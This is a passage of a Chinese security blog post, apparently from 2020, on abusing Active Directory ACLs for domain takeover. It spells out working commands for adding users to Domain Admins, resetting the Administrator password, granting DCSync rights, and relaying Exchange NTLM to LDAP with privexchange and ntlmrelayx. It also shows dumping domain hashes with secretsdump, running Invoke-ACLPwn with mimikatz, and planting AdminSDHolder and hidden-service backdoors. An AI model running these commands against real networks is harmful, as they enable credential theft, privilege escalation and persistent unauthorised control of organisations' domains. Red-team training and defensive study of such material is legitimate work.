+<h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><p>一些比较有实战价值的权限，可以用以在域渗透的时候寻找攻击路径或者用于充当后门。</p>
+<p><strong>对某些属性的WriteProperty ，有以下属性</strong></p>
+<p>addmember(bf9679c0-0de6-11d0-a285-00aa003049e2)<br>servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)<br>GPC-File-Sys-Path(f30e3bc1-9ff0-11d1-b603-0000f80367c1)</p>
+<h4 id="addmember"><a href="#addmember" class="headerlink" title="addmember"></a>addmember</h4><p>可以将任意用户，组或计算机添加到目标组。<br>如果一个用户对一个组有AddMembers权限，那么这个用户可以讲任何用户加入这个组，从而具备这个组的权限。</p>
+<p><img src="../images/ACLNote/7.png" alt="0.png"></p>
+<p>然后此时我们的用户便对改组拥有了写入权限，那么我们便可以使用下面的命令将任意用户加入域管，将其变为域管</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind -users -rb CN=bypass -dsq|admod -users -rb CN=&quot;Domain Admins&quot; -stdinadd member</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/8.png" alt="0.png"></p>
+<p>此时，该用户已获得域管权限</p>
+<p><img src="../images/ACLNote/9.png" alt="0.png"></p>
+<p>BLOODHOUND查询语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:User &#123;admincount:False&#125;) MATCH p=allShortestPaths((n)-[r:AddMember*1..]-&gt;(m:Group)) RETURN p</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/10.png" alt="0.png"></p>
+<h3 id="扩展权限有"><a href="#扩展权限有" class="headerlink" title="扩展权限有"></a>扩展权限有</h3><p><strong>User-Force-Change-Password(0299570-246d-11d0-a768-00aa006e0529)</strong><br>可以在不知道当前目标用户的密码的情况下更改目标用户的密码<br><strong>DS-Replication-Get-Changes(1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) 和 DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</strong><br>对域对象具有这两个扩展权限的用户具备dcsync 权限</p>
+<p>User-Force-Change-Password(0299570-246d-11d0-a768-00aa006e0529)<br>可以在不知道当前目标用户的密码的情况下更改目标用户的密码</p>
+<p><img src="../images/ACLNote/11.png" alt="0.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -b CN=administrator,CN=Users,DC=offensive,DC=org -sc getacl -sddlfilter ;;;; offensive\bypass</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/12.png" alt="0.png"></p>
+<p>然后即可更改密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admod  -b CN=Administrator,CN=Users,DC=test,DC=local unicodepwd::123!@#qazwsx -optenc</span><br></pre></td></tr></table></figure>
+<p>BLOODHOUND查询语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:User &#123;admincount:False&#125;) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]-&gt;(m:Computer)) RETURN p</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/13.png" alt="0.png"></p>
+<p>DS-Replication-Get-Changes(1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) 和 DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</p>
+<p>域对象只需要具备一下这两个权限，就有dcsync的权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ObjectACL -PrincipalIdentity spotless -Rights DCSync</span><br></pre></td></tr></table></figure>
+<p>或者使用adexplore：</p>
+<p><img src="../images/ACLNote/14.png" alt="0.png"></p>
+<p>adfind查看</p>
+<p><img src="../images/ACLNote/15.png" alt="0.png"></p>
+<p>此时便可使用dcsync攻击</p>
+<p><img src="../images/ACLNote/16.png" alt="0.png"></p>
+<p>查询语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:User &#123;admincount:False&#125;) MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|SQLAdmin*1..]-&gt;(m)) RETURN p</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/17.png" alt="0.png"></p>
+<p><img src="../images/ACLNote/18.png" alt="0.png"></p>
+<h4 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h4><p>跟之前的基本一样，这里不再阐述.</p>
+<p>Self (Self-Membership) on Group<br>这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</p>
+<p><img src="../images/ACLNote/19.png" alt="0.png"></p>
+<h4 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h4><p>WriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A能利用这个权限给自己附加其他的权限。</p>
+<p><img src="../images/ACLNote/20.png" alt="0.png"></p>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="Exchange相关"><a href="#Exchange相关" class="headerlink" title="Exchange相关"></a>Exchange相关</h3><p>在域环境中，安装Exchange后会添加一个名为Microsoft Exchange Security Groups的OU，其中包括两个特殊的组：Exchange Trusted Subsystem和Exchange Windows Permission，如果获得了这两个组内任意用户的控制权限，就能够继承该组的WriteDACL权限，进而修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash。接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限。</p>
+<p>组名如下：</p>
+<ul>
+<li>Exchange Trusted Subsystem</li>
+<li>Exchange Windows Permission</li>
+<li>Organization Management</li>
+</ul>
+<p>安装Exchange后默认会自动添加一个名为Microsoft Exchange Security Groups的OU。</p>
+<p><img src="../images/ACLNote/21.png" alt="0.png"></p>
+<p>其中包括两个特殊的组：Exchange Trusted Subsystem和Exchange Windows Permission<br>Exchange Trusted Subsystem是Exchange Windows Permission的成员</p>
+<p><img src="../images/ACLNote/22.png" alt="0.png"></p>
+<p>默认情况下，<br>Exchange Windows Permissions对安装Exchange的域对象具有WriteDACL权限，那么<br>Exchange Trusted Subsystem也会继承这个权限,权限查看方法如下：</p>
+<p><img src="../images/ACLNote/23.png" alt="0.png"></p>
+<p>然后在下面找到Exchange Windows Permissions这个OU,右键–&gt;高级，查看安全描述符</p>
+<p><img src="../images/ACLNote/24.png" alt="0.png"></p>
+<p>就会发现该组具有writeacl权限</p>
+<p><img src="../images/ACLNote/25.png" alt="0.png"></p>
+<p><strong>如果对域对象具有WriteDACL权限，就能够为指定域用户添加ACE，使其获得利用DCSync导出域内所有用户hash的权限，接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限</strong></p>
+<p>下面来复现一下整个攻击过程：</p>
+<p>首先我们这里把一个用户加入到这个组里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ADGroupMember -Identity &quot;Exchange Trusted Subsystem&quot; -Members testa</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/26.png" alt="0.png"></p>
+<p>我们查询可知，该用户已拥有了相关我们所需要的权限</p>
+<p><img src="../images/ACLNote/27.png" alt="0.png"></p>
+<p><img src="../images/ACLNote/28.png" alt="0.png"></p>
+<p>那么下面我们使用该用户进行我们的dcsync攻击。</p>
+<p><img src="../images/ACLNote/29.png" alt="0.png"></p>
+<p>或者使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Invoke-ACLPwn.ps1 -SharpHoundLocation .\SharpHound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn krbtgt</span><br></pre></td></tr></table></figure>
+<h3 id="NTLMRelay与DCSync"><a href="#NTLMRelay与DCSync" class="headerlink" title="NTLMRelay与DCSync"></a>NTLMRelay与DCSync</h3><p>NTLMRelay是一个已经存在了很久的攻击方式，在2018年和2019年分别爆出了关于Exchange的SSRF漏洞（CVE-2018-8581）+NTLMRelay攻击、CVE-2019-1040 NTLM协议漏洞的两种利用方式，传播最广泛的利用方式就是通过这两个漏洞对域对象的ACL进行改写，实现DCSync，从而获取krbtgt账户的HASH值.</p>
+<h4 id="CVE-2018-8581"><a href="#CVE-2018-8581" class="headerlink" title="CVE-2018-8581"></a>CVE-2018-8581</h4><p>该漏洞主要有两种玩法，一种是可以伪造任意用户，进行邮件操作，而另一种就是通过我们的NTML Relay获取到krbtgt的hash。该hash可用于制作黄金票据，最后达到全域通畅的效果。这里主要是第二种玩法</p>
+<p>说起NTML Relay可以用下面这张图来进行讲解，或者后面专门写一篇文章来聊一聊这个。</p>
+<p><img src="../images/ACLNote/30.png" alt="0.png"></p>
+<p>其实你可以将其理解为是一个中间人攻击，假设我们的将左边的机器称之为server1右边的机器称之为server2，那么如图所示Server1 与 Attack的过程就是在进行挑战响应，但是Attack还会将Server1的请求转发一次到Server2，最终结果就是Attack将会模拟了Server1的身份对Server2进行操作。很多时候，在讲解挑战响应机制的时候，协议使用的smb协议。因为SMB Relay危害较大，所以在MS08-068中已经进行修复，主要是禁止SMB -&gt; SMB在同一台机器上的重放。而http–&gt;smb也在MS16-075进行修复。</p>
+<p>而我们这里需要进行的则是HTTP -&gt; LDAP，通过Exchange获取到相关数据，然后通过LDAP协议Relay到域控上。</p>
+<p>Exchange所在的Exchange Windows Permissions组默认具有writeDACL权限，也就是写ACL权限,这样普通用户就能使用DCSync进行Dump域控的Hash。</p>
+<p>复现过程</p>
+<p>首先需要进行LDAP监听，然后进行SSRF攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python privexchange.py -ah 192.168.2.114 192.168.2.108 -u exchange -p abc123\! -d contoso --debug</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/31.png" alt="0.png"></p>
+<p>然后我们的用户即可获取相应的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://192.168.2.109 --escalate-user exchange</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/32.png" alt="0.png"></p>
+<p>然后dump hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py contoso/exchange@192.168.2.109 -just-dc</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/33.png" alt="0.png"></p>
+<p>然后即可制作金票，获取域控操作权限。</p>
+<p>若出现ssl问题，可尝试更改代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uv_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)</span><br><span class="line">uv_context.verify_mode = ssl.CERT_NONE</span><br><span class="line">uv_context.check_hostname = False</span><br></pre></td></tr></table></figure>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>CVE-2020-16939,利用DACL覆写提权。</p>
+<p><img src="../images/ACLNote/34.png" alt="0.png"></p>
+<h3 id="Invoke-ACLPwn"><a href="#Invoke-ACLPwn" class="headerlink" title="Invoke-ACLPwn"></a>Invoke-ACLPwn</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn &apos;Administrator&apos;</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username &apos;testuser&apos; -Domain &apos;xenoflux.local&apos; -Password &apos;Welcome01!&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/35.png" alt="0.png"></p>
+<h3 id="RACE"><a href="#RACE" class="headerlink" title="RACE"></a>RACE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-RemoteWMI -SamAccountName labuser -ComputerName ops-dc</span><br><span class="line">Set-RemotePSRemoting -SamAccountName labuser -ComputerName ops-dc</span><br><span class="line">Set-RemoteRegistryPermissions -SamAccountName labuser -ComputerName ops-mssql -Verbose </span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<p><img src="../images/ACLNote/36.png" alt="0.png"></p>
+<p><img src="../images/ACLNote/37.png" alt="0.png"></p>
+<h3 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h3><p>AdminSDHolder会将自身的ACL列表每隔一个小时向受保护的组中同步，所以如果在AdminSDHolder中添加一个ACE作为后门，则受保护的组中将会一直被同步策略。</p>
+<p>powerview操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;CN=AdminSDHolder,CN=System,DC=test,DC=local&quot; -PrincipalIdentity zhangs -Rights All</span><br></pre></td></tr></table></figure>
+<p>60分钟后，则会获得所有权限。</p>
+<p>然后加入域管理组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ObjectAcl -SamAccountName &quot;Domain Admins&quot; -ResolveGUIDs | ?&#123;$_.IdentityReference -match &apos;testa&apos;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="SDDL隐藏服务"><a href="#SDDL隐藏服务" class="headerlink" title="SDDL隐藏服务"></a>SDDL隐藏服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br></pre></td></tr></table></figure>
+<p>恢复</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br><span class="line">[SC] SetServiceObjectSecurity SUCCESS</span><br></pre></td></tr></table></figure>
+<p>参考文章：</p>
+<p><a href="https://support.microsoft.com/en-us/help/4490059/using-shared-permissions-model-to-run-exchange-server" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/4490059/using-shared-permissions-model-to-run-exchange-server</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/</a></p>
+<p><a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/" target="_blank" rel="noopener">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/</a></p>
+<p><a href="https://www.cnblogs.com/zplutor/archive/2010/01/05/1639892.html" target="_blank" rel="noopener">https://www.cnblogs.com/zplutor/archive/2010/01/05/1639892.html</a></p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/11#0x02-acl-jian-jie" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ldap-pian/11#0x02-acl-jian-jie</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/ad/how-access-control-works-in-active-directory-domain-services" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/ad/how-access-control-works-in-active-directory-domain-services</a></p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/13" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ldap-pian/13</a></p>
+<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></p>
+<p><a href="https://github.com/infosecn1nja/AD-Attack-Defense" target="_blank" rel="noopener">https://github.com/infosecn1nja/AD-Attack-Defense</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-entries</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/how-dacls-control-access-to-an-object" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/how-dacls-control-access-to-an-object</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format</a></p>
+<p><a href="https://sensepost.com/blog/2020/ace-to-rce/" target="_blank" rel="noopener">https://sensepost.com/blog/2020/ace-to-rce/</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/</a></p>
+<p><a href="https://github.com/rogue-kdc/CVE-2020-16939" target="_blank" rel="noopener">https://github.com/rogue-kdc/CVE-2020-16939</a></p>
+<p><a href="https://www.thezdi.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation</a></p>
+<p><a href="https://github.com/samratashok/RACE" target="_blank" rel="noopener">https://github.com/samratashok/RACE</a></p>
+<p><a href="https://www.labofapenetrationtester.com/2019/08/race.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2019/08/race.html</a></p>
+<p><a href="https://0kee.360.cn/blog/microsoft-exchange-cve-2018-8581/" target="_blank" rel="noopener">https://0kee.360.cn/blog/microsoft-exchange-cve-2018-8581/</a></p>
+<p><a href="https://www.secquan.org/Share/1068537" target="_blank" rel="noopener">https://www.secquan.org/Share/1068537</a></p>
+<p><a href="https://www.secquan.org/Discuss/1070826" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070826</a></p>
+<p><a href="https://www.cnblogs.com/jianyus/p/3170732.html" target="_blank" rel="noopener">https://www.cnblogs.com/jianyus/p/3170732.html</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/ACLNote/">ACL攻防漫谈</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年11月27日 - 20:11</p>
+  <p><span>最后更新:</span>2020年11月27日 - 21:11</p>
+  <p><span>原始链接:</span><a href="/ACLNote/" title="ACL攻防漫谈">https://lengjibo.github.io/ACLNote/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/ACLNote/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/fishing/" rel="next" title="聊聊宏钓鱼">
+                <i class="fa fa-chevron-left"></i> 聊聊宏钓鱼
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table Des Matières
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Ensemble
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">115</span>
+                    <span class="site-state-item-name">articles</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
